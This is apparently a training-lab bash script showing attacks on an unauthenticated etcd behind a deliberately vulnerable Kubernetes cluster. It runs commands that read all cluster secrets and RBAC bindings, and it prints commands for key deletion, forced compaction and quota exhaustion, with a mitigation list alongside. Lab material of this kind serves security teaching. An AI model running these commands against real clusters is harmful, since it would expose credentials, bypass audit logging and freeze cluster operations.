#!/usr/bin/env bash
# =============================================================================
# etcd Corruption Demonstration
# =============================================================================
#
# PURPOSE: Demonstrates how an unprotected etcd instance can be exploited to
# corrupt Kubernetes cluster state, bypass API server validation, and cause
# cluster-wide failures.
#
# BACKGROUND:
#   etcd is the backbone of Kubernetes - it stores ALL cluster state:
#   - Pod definitions, deployments, services
#   - Secrets, ConfigMaps, certificates
#   - RBAC policies, network policies
#   - Node registrations, lease information
#
#   If an attacker gains direct access to etcd (bypassing the API server),
#   they can read, modify, or delete ANY cluster data without restriction.
#
# PREREQUISITES:
#   - Vulnerable Kind cluster with etcd exposed on port 2379
#   - etcdctl installed (or use the one in the Kind node)
#   - No TLS/auth on etcd (as configured in kind-config.yaml)
#
# WARNING: These operations WILL corrupt cluster state.
# Run ONLY on disposable test clusters.
#
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
NAMESPACE="insecure-ns"

# etcd endpoint (exposed by our vulnerable Kind config)
ETCD_ENDPOINT="${ETCD_ENDPOINT:-http://localhost:2379}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log_info()    { echo -e "${GREEN}[INFO]${NC}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${NC}    $*"; }
log_error()   { echo -e "${RED}[ERROR]${NC}   $*"; }
log_attack()  { echo -e "${RED}[ATTACK]${NC}  $*"; }
log_explain() { echo -e "${CYAN}[EXPLAIN]${NC} $*"; }
log_cmd()     { echo -e "${MAGENTA}[CMD]${NC}     $*"; }

section() {
    echo ""
    echo -e "${BLUE}=================================================================${NC}"
    echo -e "${BLUE} $*${NC}"
    echo -e "${BLUE}=================================================================${NC}"
    echo ""
}

pause() {
    echo ""
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read -r
}

# ---------------------------------------------------------------------------
# Helper: Run etcdctl command
# ---------------------------------------------------------------------------
# In the Kind cluster, etcdctl is available inside the control-plane node.
# We exec into the node's etcd container or use a locally installed etcdctl.
run_etcdctl() {
    # Try local etcdctl first, then try via docker exec into Kind node
    if command -v etcdctl &>/dev/null; then
        ETCDCTL_API=3 etcdctl --endpoints="${ETCD_ENDPOINT}" "$@" 2>/dev/null
    else
        # Run inside the Kind control-plane node
        docker exec vuln-k8s-lab-control-plane \
            etcdctl --endpoints=https://127.0.0.1:2379 \
                    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
                    --cert=/etc/kubernetes/pki/etcd/server.crt \
                    --key=/etc/kubernetes/pki/etcd/server.key \
                    "$@" 2>/dev/null
    fi
}

# ---------------------------------------------------------------------------
# Preflight: Check etcd accessibility
# ---------------------------------------------------------------------------
preflight() {
    section "Preflight: Checking etcd Access"

    log_info "Checking if etcd is accessible..."

    # Try direct access (insecure port)
    if curl -s "${ETCD_ENDPOINT}/health" 2>/dev/null | grep -q "true"; then
        log_warn "etcd is accessible WITHOUT authentication at ${ETCD_ENDPOINT}"
        log_warn "This is a CRITICAL security vulnerability."
    else
        log_info "Direct etcd access not available. Trying via Kind node..."

        if docker exec vuln-k8s-lab-control-plane etcdctl version &>/dev/null; then
            log_info "etcdctl available via Kind control-plane node."
        else
            log_error "Cannot access etcd. Ensure the vulnerable cluster is running."
            log_error "Run: ../setup-vulnerable-cluster.sh create"
            exit 1
        fi
    fi
    echo ""
}

# =============================================================================
# ATTACK 1: Read ALL Cluster Secrets from etcd
# =============================================================================

attack_read_secrets() {
    section "ATTACK 1: Read ALL Cluster Secrets from etcd"

    log_explain "Kubernetes Secrets are stored in etcd in base64 encoding by default."
    log_explain "With direct etcd access, ALL secrets can be read - including:"
    log_explain "  - Service account tokens"
    log_explain "  - TLS certificates and private keys"
    log_explain "  - Database passwords"
    log_explain "  - API keys"
    log_explain "  - Docker registry credentials"
    echo ""

    log_attack "Step 1: List all secret keys in etcd"
    log_cmd "etcdctl get /registry/secrets/ --prefix --keys-only | head -20"
    run_etcdctl get /registry/secrets/ --prefix --keys-only 2>/dev/null | head -20 || true
    echo ""

    log_attack "Step 2: Read a specific secret (kube-system service account token)"
    log_explain "This retrieves the raw etcd value, which contains the Secret object."
    log_explain "Note: In etcd, secrets are NOT encrypted by default."
    log_cmd "etcdctl get /registry/secrets/kube-system/ --prefix --keys-only | head -5"
    local first_secret
    first_secret=$(run_etcdctl get /registry/secrets/kube-system/ --prefix --keys-only 2>/dev/null | head -1)
    if [[ -n "$first_secret" ]]; then
        echo "  Found secret: $first_secret"
        log_cmd "etcdctl get ${first_secret} --print-value-only | strings | head -20"
        run_etcdctl get "$first_secret" --print-value-only 2>/dev/null | strings | head -20 || true
    else
        echo "  (No secrets found or access denied)"
    fi
    echo ""

    log_warn "IMPACT: ALL cluster secrets exposed. Passwords, tokens, certificates."
    log_warn "This is equivalent to database admin access to the entire cluster."
    echo ""
    echo "  MITIGATION:"
    echo "  - Enable etcd encryption at rest (EncryptionConfiguration)"
    echo "  - Require TLS client certificates for etcd access"
    echo "  - Restrict network access to etcd (only API server)"
    echo "  - Use external KMS provider for secret encryption"
}

# =============================================================================
# ATTACK 2: Modify RBAC Policies Directly in etcd
# =============================================================================

attack_modify_rbac() {
    section "ATTACK 2: Modify RBAC Policies Directly in etcd"

    log_explain "By writing directly to etcd, an attacker can modify RBAC policies"
    log_explain "without going through the API server's admission control."
    log_explain "This means audit logs, webhooks, and validation are ALL bypassed."
    echo ""

    log_attack "Step 1: List all ClusterRoleBindings in etcd"
    log_cmd "etcdctl get /registry/clusterrolebindings/ --prefix --keys-only | head -10"
    run_etcdctl get /registry/clusterrolebindings/ --prefix --keys-only 2>/dev/null | head -10 || true
    echo ""

    log_attack "Step 2: Read the cluster-admin ClusterRoleBinding"
    log_cmd "etcdctl get /registry/clusterrolebindings/cluster-admin --print-value-only | strings"
    run_etcdctl get /registry/clusterrolebindings/cluster-admin --print-value-only 2>/dev/null | strings | head -20 || true
    echo ""

    log_explain "An attacker could modify this binding to grant themselves cluster-admin"
    log_explain "privileges, or create a new binding that the API server audit logs"
    log_explain "would never record."
    echo ""

    log_warn "IMPACT: RBAC bypass. Attacker gains any privilege level without audit trail."
    log_warn "This is undetectable through normal Kubernetes audit logging."
}

# =============================================================================
# ATTACK 3: Delete Critical Cluster Resources
# =============================================================================

attack_delete_resources() {
    section "ATTACK 3: Delete Critical Cluster Resources from etcd"

    log_explain "Deleting keys from etcd directly causes cluster resources to vanish"
    log_explain "without triggering finalizers, garbage collection, or audit logs."
    log_explain "This can cause cascading failures throughout the cluster."
    echo ""

    # Create a test resource first
    log_info "Creating a test deployment for the deletion demo..."
    kubectl create deployment etcd-test --image=nginx:1.21 -n "${NAMESPACE}" 2>/dev/null || true
    sleep 3

    log_attack "Step 1: List deployments in etcd"
    log_cmd "etcdctl get /registry/deployments/${NAMESPACE}/ --prefix --keys-only"
    run_etcdctl get "/registry/deployments/${NAMESPACE}/" --prefix --keys-only 2>/dev/null || true
    echo ""

    log_attack "Step 2: Show what direct key deletion would do"
    log_explain "Deleting /registry/deployments/${NAMESPACE}/etcd-test from etcd would:"
    echo "  1. The Deployment object vanishes from the cluster"
    echo "  2. The ReplicaSet controller loses its parent reference"
    echo "  3. Pods become orphaned (no owner, no management)"
    echo "  4. No audit log entry is created"
    echo "  5. Finalizers are NOT executed"
    echo "  6. Dependent resources may be leaked"
    echo ""

    log_explain "We will NOT actually delete the key (too destructive for demo)."
    log_explain "Instead, showing the command that would be used:"
    echo ""
    echo -e "${RED}  etcdctl del /registry/deployments/${NAMESPACE}/etcd-test${NC}"
    echo ""

    # Clean up test resource
    kubectl delete deployment etcd-test -n "${NAMESPACE}" 2>/dev/null || true

    log_warn "IMPACT: Cluster state corruption, orphaned resources, no audit trail."
}

# =============================================================================
# ATTACK 4: Force etcd Compaction (Disrupt Watches)
# =============================================================================

attack_compaction() {
    section "ATTACK 4: Force etcd Compaction (Disrupt Watch Streams)"

    log_explain "etcd compaction removes historical revisions. The API server relies"
    log_explain "on historical revisions for watch streams (resourceVersion-based)."
    log_explain "Forcing compaction to the latest revision causes ALL watches to"
    log_explain "receive 'resource version too old' errors, breaking controllers."
    echo ""

    log_attack "Step 1: Get current etcd revision"
    log_cmd "etcdctl endpoint status --write-out=json | jq '.header.revision'"
    local revision
    revision=$(run_etcdctl endpoint status --write-out=json 2>/dev/null | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    if isinstance(data, list):
        print(data[0].get('Status', {}).get('header', {}).get('revision', 'unknown'))
    else:
        print(data.get('Status', {}).get('header', {}).get('revision', 'unknown'))
except:
    print('unknown')
" 2>/dev/null || echo "unknown")
    echo "  Current etcd revision: ${revision}"
    echo ""

    log_attack "Step 2: Show compaction command (not executing)"
    log_explain "Compacting to the current revision would invalidate ALL watches:"
    echo ""
    echo -e "${RED}  etcdctl compact ${revision}${NC}"
    echo ""
    echo "  Effects of forced compaction:"
    echo "  - ALL watch streams receive 'ErrCompacted' errors"
    echo "  - kube-controller-manager must re-list all resources"
    echo "  - kube-scheduler loses its informer cache"
    echo "  - All client watchers (operators, CRD controllers) disconnect"
    echo "  - Thundering herd effect as all controllers re-sync simultaneously"
    echo ""

    log_warn "IMPACT: Temporary cluster-wide control plane disruption."
    log_warn "All controllers and operators restart their watch streams simultaneously."
}

# =============================================================================
# ATTACK 5: Write Oversized Values (etcd Quota Exhaustion)
# =============================================================================

attack_quota_exhaustion() {
    section "ATTACK 5: etcd Quota Exhaustion"

    log_explain "etcd has a database size quota (default 2GB, max 8GB)."
    log_explain "When the quota is exceeded, etcd enters 'alarm' mode and"
    log_explain "rejects ALL write operations. The cluster becomes read-only."
    echo ""

    log_attack "Step 1: Check current etcd database size"
    log_cmd "etcdctl endpoint status --write-out=table"
    run_etcdctl endpoint status --write-out=table 2>/dev/null || true
    echo ""

    log_attack "Step 2: Show quota exhaustion technique"
    log_explain "An attacker would write many large values to fill the database:"
    echo ""
    echo -e "${RED}  # Write 1MB values repeatedly until quota is reached${NC}"
    echo -e "${RED}  for i in \$(seq 1 2048); do${NC}"
    echo -e "${RED}    etcdctl put /attack/payload-\$i \$(head -c 1048576 /dev/urandom | base64)${NC}"
    echo -e "${RED}  done${NC}"
    echo ""
    echo "  After ~2048 iterations (2GB), etcd enters alarm mode."
    echo "  ALL write operations fail with: 'etcdserver: mvcc: database space exceeded'"
    echo ""

    log_attack "Step 3: Show etcd alarm status check"
    log_cmd "etcdctl alarm list"
    run_etcdctl alarm list 2>/dev/null || true
    echo ""

    echo "  When etcd is in alarm mode:"
    echo "  - No new pods can be created"
    echo "  - No deployments can be updated"
    echo "  - No secrets can be created or rotated"
    echo "  - Node heartbeats may fail (node NotReady)"
    echo "  - Certificate rotation fails"
    echo "  - The cluster is effectively frozen"
    echo ""

    log_warn "IMPACT: Complete cluster write lockout."
    log_warn "Recovery requires manual etcd compaction and defragmentation."
    echo ""
    echo "  Recovery steps (if this happens):"
    echo "  1. etcdctl compact <current_revision>"
    echo "  2. etcdctl defrag"
    echo "  3. etcdctl alarm disarm"
    echo "  4. Verify cluster health"
}

# =============================================================================
# Summary
# =============================================================================

print_summary() {
    section "Summary of etcd Corruption Techniques"

    echo -e "${RED}Attack Techniques Demonstrated:${NC}"
    echo ""
    echo "  1. Secret extraction       : Read ALL secrets from etcd"
    echo "  2. RBAC manipulation       : Modify policies bypassing API server"
    echo "  3. Resource deletion       : Delete objects without audit trail"
    echo "  4. Watch disruption        : Force compaction to break controllers"
    echo "  5. Quota exhaustion        : Fill etcd to freeze the cluster"
    echo ""
    echo -e "${GREEN}Key Mitigations:${NC}"
    echo ""
    echo "  - CRITICAL: Enable TLS client auth for etcd"
    echo "  - CRITICAL: Restrict etcd network access (only API server)"
    echo "  - Enable encryption at rest for etcd data"
    echo "  - Use external KMS for secret encryption"
    echo "  - Monitor etcd metrics (db_size, alarm status)"
    echo "  - Regular etcd backups"
    echo "  - Set etcd --quota-backend-bytes appropriately"
    echo "  - Use network policies to isolate etcd"
    echo ""
    echo "  See mitigation.md for comprehensive protection strategies."
    echo ""
}

# =============================================================================
# Main
# =============================================================================

usage() {
    echo "Usage: $0 [ATTACK_NUMBER]"
    echo ""
    echo "Attacks:"
    echo "  1      Read all secrets from etcd"
    echo "  2      Modify RBAC policies directly"
    echo "  3      Delete critical resources"
    echo "  4      Force compaction (disrupt watches)"
    echo "  5      etcd quota exhaustion"
    echo "  all    Run all attacks (default)"
    echo ""
}

main() {
    local attack="${1:-all}"

    echo -e "${RED}"
    echo "============================================================"
    echo " ETCD CORRUPTION DEMONSTRATIONS"
    echo " FOR AUTHORIZED SECURITY TESTING ONLY"
    echo " WARNING: These attacks target the cluster's data store"
    echo "============================================================"
    echo -e "${NC}"

    preflight

    case "$attack" in
        1) attack_read_secrets ;;
        2) attack_modify_rbac ;;
        3) attack_delete_resources ;;
        4) attack_compaction ;;
        5) attack_quota_exhaustion ;;
        all)
            attack_read_secrets
            pause
            attack_modify_rbac
            pause
            attack_delete_resources
            pause
            attack_compaction
            pause
            attack_quota_exhaustion
            print_summary
            ;;
        help|--help|-h) usage ;;
        *) echo "Unknown attack: $attack"; usage; exit 1 ;;
    esac
}

main "$@"
